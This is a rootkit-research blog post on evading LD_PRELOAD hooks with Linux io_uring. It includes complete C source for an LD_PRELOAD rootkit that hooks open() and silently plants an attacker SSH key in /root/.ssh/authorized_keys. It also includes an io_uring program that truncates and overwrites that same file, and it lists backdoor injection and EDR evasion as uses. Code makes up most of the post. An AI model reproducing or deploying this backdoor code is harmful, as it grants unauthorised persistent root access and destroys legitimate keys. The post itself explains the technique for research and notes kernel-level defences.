---
title: breaking ld_preload rootkit hooks
image: https://i.imgur.com/xeSd64L.png
description: I miss you
categories: [Malware]
tags: [Rootkit]
author: 0xMatheuZ
---

![imgur](https://i.imgur.com/TGcNnzI.png)

This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as `open()`, `write()`, and `close()`, which are commonly intercepted in LD_PRELOAD based hooks, it's possible to evade detection or interference by such malicious userspace mechanisms.

We demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the `open()` call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., `io_uring_enter`, `io_uring_setup`) for coordination.

## Introduction to io_uring

`io_uring` is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.


Key Benefits of io_uring:

- **Lower syscall overhead**
- **Direct submission of I/O reduces the frequency and cost of context switches**
- **Kernel land execution reduces visibility to userland hooks**

This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.

## Rootkits via LD_PRELOAD

A common technique used in userland rootkits is to hook libc functions like `open()`, `read()`, and `write()` using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.

## Example: LD_PRELOAD Rootkit Explained

This example demonstrates a userspace hook for the `open()` function to detect when a process tries to open `/root/.ssh/authorized_keys`, and instead injects an SSH key, enabling unauthorized access.

```c

// https://discord.gg/66N5ZQppU7

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <dlfcn.h>
#include <stdarg.h>

typedef int (*open_func_type)(const char *, int, ...);

static open_func_type orig_open = NULL;

static int target(const char *pathname) {
    if (pathname == NULL) return 0;

    return strcmp(pathname, "/root/.ssh/authorized_keys") == 0 ||
           strcmp(pathname, "authorized_keys") == 0 ||
           strcmp(pathname, ".ssh/authorized_keys") == 0;
}

int open(const char *pathname, int flags, ...) {
    va_list args;
    mode_t mode = 0;

    if (!orig_open) {
        orig_open = (open_func_type)dlsym(RTLD_NEXT, "open");
        if (!orig_open) {
            fprintf(stderr, "Error loading orig open function: %s\n", dlerror());
            exit(EXIT_FAILURE);
        }
    }

    if (flags & O_CREAT) {
        va_start(args, flags);
        mode = va_arg(args, int);
        va_end(args);
    }

    if (target(pathname)) {
        int fd = orig_open("/root/.ssh/authorized_keys", O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (fd < 0) {
            return fd;
        }

        const char *sshkey = "ssh-rsa ....snip kali@kali\n";
        write(fd, sshkey, strlen(sshkey));

        close(fd);
        return orig_open("/root/.ssh/authorized_keys", O_RDWR | O_APPEND, 0600);
    }

    if (flags & O_CREAT) {
        return orig_open(pathname, flags, mode);
    } else {
        return orig_open(pathname, flags);
    }
} 
```

## Detailed Behavior of the LD_PRELOAD Rootkit

This rootkit relies on the LD_PRELOAD environment variable to hijack the `open()` function call from the standard C library. Here's a breakdown of its logic and behavior:

```c
typedef int (*open_func_type)(const char *, int, ...);
static open_func_type orig_open = NULL;
```

A new function pointer type is defined for `open()`, allowing us to call the real `open()` after we hook it. orig_open will be initialized using dlsym() to point to the original function.

Target File Detection

```c
static int target(const char *pathname) {
    return pathname && (
        strcmp(pathname, "/root/.ssh/authorized_keys") == 0 ||
        strcmp(pathname, "authorized_keys") == 0 ||
        strcmp(pathname, ".ssh/authorized_keys") == 0
    );
}
```

The `target()` function checks if the file being accessed is the SSH authorized keys file. It performs a simple `strcmp()` against several known variants of the authorized_keys path.

Hooking the `open()` Function

```c
int open(const char *pathname, int flags, ...) {
```

This is our hook. Because the name matches `open()` and LD_PRELOAD is set, all calls to `open()` will now invoke this custom implementation.

```c
    if (!orig_open) {
        orig_open = (open_func_type)dlsym(RTLD_NEXT, "open");
        if (!orig_open) {
            fprintf(stderr, "Error loading original open: %s
", dlerror());
            exit(EXIT_FAILURE);
        }
    }
```

On the first call, we use `dlsym(RTLD_NEXT, "open")` to resolve the real `open()` function from the next link in the shared object chain. This avoids recursion.

```c
    if (flags & O_CREAT) {
        va_start(args, flags);
        mode = va_arg(args, int);
        va_end(args);
    }
```

If the `O_CREAT` flag is present, we extract the `mode_t` argument from the variadic list.

```c
    if (target(pathname)) {
        int fd = orig_open("/root/.ssh/authorized_keys", O_WRONLY | O_CREAT | O_TRUNC, 0600);
```

If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.

```c
        const char *sshkey = "ssh-rsa AAAAB3...snip... kali@kali
";
        write(fd, sshkey, strlen(sshkey));
        close(fd);
```

A malicious SSH public key is written into the file, and the file is closed.

```c
        return orig_open("/root/.ssh/authorized_keys", O_RDWR | O_APPEND, 0600);
    }
```    

After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.

```c

    return (flags & O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags);
```

If the file is not one of the targets, the call is passed directly to the original `open()` function, maintaining transparency.

Summary of Behavior:

- **Intercepts calls to open() via LD_PRELOAD**
- **ilters paths that match authorized_keys**
- **Overwrites the file and injects a SSH public key**
- **Reopens the file with appropriate permissions to avoid suspicion**
- **Acts transparently for all other files, mimicking normal behavior**

This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.

## Bypassing the Hook with io_uring

Here, we use `io_uring`to bypass the hooked `open()` function by submitting kernel level I/O requests directly.

Full Code with Explanations:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <linux/io_uring.h>
#include <liburing.h>

#define FILE_PATH "/root/.ssh/authorized_keys"
#define CONTENT "random"

int main() {
    struct io_uring ring;
    int ret, fd;
    struct iovec iov;
    const char *content = CONTENT;
    size_t content_len = strlen(content);

    ret = io_uring_queue_init(1, &ring, 0);
    if (ret < 0) {
        perror("io_uring_queue_init");
        return 1;
    }

    struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
    if (!sqe) {
        fprintf(stderr, "Could not get SQE\n");
        return 1;
    }

    io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    io_uring_sqe_set_data(sqe, (void *)1);

    ret = io_uring_submit(&ring);
    if (ret < 0) {
        perror("io_uring_submit");
        return 1;
    }

    struct io_uring_cqe *cqe;
    ret = io_uring_wait_cqe(&ring, &cqe);
    if (ret < 0) {
        perror("io_uring_wait_cqe");
        return 1;
    }

    fd = cqe->res;
    io_uring_cqe_seen(&ring, cqe);

    if (fd < 0) {
        fprintf(stderr, "Failed to open file: %d\n", fd);
        return 1;
    }

    sqe = io_uring_get_sqe(&ring);
    if (!sqe) {
        fprintf(stderr, "Could not get SQE\n");
        close(fd);
        return 1;
    }

    iov.iov_base = (void *)content;
    iov.iov_len = content_len;
    io_uring_prep_writev(sqe, fd, &iov, 1, 0);
    io_uring_sqe_set_data(sqe, (void *)2);

    ret = io_uring_submit(&ring);
    if (ret < 0) {
        perror("io_uring_submit");
        close(fd);
        return 1;
    }

    ret = io_uring_wait_cqe(&ring, &cqe);
    if (ret < 0) {
        perror("io_uring_wait_cqe");
        close(fd);
        return 1;
    }

    if (cqe->res < 0) {
        fprintf(stderr, "Write failed: %d\n", cqe->res);
    }

    io_uring_cqe_seen(&ring, cqe);

    sqe = io_uring_get_sqe(&ring);
    if (!sqe) {
        fprintf(stderr, "Could not get SQE\n");
        close(fd);
        return 1;
    }

    io_uring_prep_close(sqe, fd);
    io_uring_sqe_set_data(sqe, (void *)3);

    ret = io_uring_submit(&ring);
    if (ret < 0) {
        perror("io_uring_submit");
        close(fd);
        return 1;
    }

    ret = io_uring_wait_cqe(&ring, &cqe);
    if (ret == 0) {
        io_uring_cqe_seen(&ring, cqe);
    }

    io_uring_queue_exit(&ring);

    printf("gg!\n");
    return 0;
}
```

Let's analyze the logic of the program step by step, fully detailing each stage:

- ### 1. Initialization

```c
ret = io_uring_queue_init(1, &ring, 0);
```

This sets up the `io_uring` interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.

- ### 2. Opening the Target File with open

```c
sqe = io_uring_get_sqe(&ring);
io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
```

This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc's `open()`, this is handed off directly to the kernel. The file `/root/.ssh/authorized_keys` will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.

- ### 3. Submitting the Request

```c
ret = io_uring_submit(&ring);
```

All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.

- ### 4. Waiting for the Open to Complete

```c
ret = io_uring_wait_cqe(&ring, &cqe);
fd = cqe->res;
```

Here we block until the kernel reports the result of the previous open operation. If successful, `cqe->res` holds the file descriptor. Otherwise, it’s a negative errno value.

- ### 5. Writing to the File

```c
iov.iov_base = (void *)content;
iov.iov_len = content_len;
io_uring_prep_writev(sqe, fd, &iov, 1, 0);
```

We set up a `writev` with a single `iovec` structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through `io_uring_submit()`.

- ### 6. Closing the File Descriptor

```c
io_uring_prep_close(sqe, fd);
```

This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.

- ### 7. Cleanup

```c
io_uring_queue_exit(&ring);
```

This releases all resources associated with the io_uring instance.

The complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like `open()`, `write()`, or `close()`) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.

- **No libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel.**
- **Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions.**
- **No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, ...) never sees these calls.**

## Security Implications

While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:

- **Inject backdoors undetected by LD_PRELOAD monitors**
- **Exfiltrate files or tamper with data covertly**
- **Operate beneath traditional EDR agents that rely on userland instrumentation**

Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as `LSM` (Linux Security Modules) and () and `eBPF`. All I/O requests issued via `io_uring` are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they're submitted. This is because io_uring still operates through the kernel's I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring

For example, `LSMs` like `SELinux` or `AppArmor` still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.

## POCs

![imgur](https://i.imgur.com/Ah49HX4.png)

In the image above, see that no `open()` and `openat()` functions were used.

![imgur](https://i.imgur.com/L6Alj1S.png)

## Conclusion

`io_uring` offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.

Become a part of **Rootkit Researchers**

* https://discord.gg/66N5ZQppU7

## References

https://kernel.dk/io_uring.pdf

